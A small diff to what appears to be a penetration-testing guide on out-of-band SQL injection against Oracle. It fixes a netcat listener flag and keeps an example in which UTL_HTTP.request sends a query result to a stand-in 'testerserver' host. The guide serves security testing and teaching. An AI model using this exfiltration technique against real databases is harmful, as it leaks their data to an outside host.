@@ -580,7 +580,7 @@ The malicious request would be:
 In this example, the tester is concatenating the value 10 with the result of the function `UTL_HTTP.request`. This Oracle function will try to connect to `testerserver` and make an HTTP GET request containing the return from the query `SELECT user FROM DUAL`. The tester can set up a web server (e.g. Apache) or use the Netcat tool:
 
 ```bash
-/home/tester/nc –nLp 80
+/home/tester/nc -nLp 80
 
 GET /SCOTT HTTP/1.1
 Host: testerserver.com
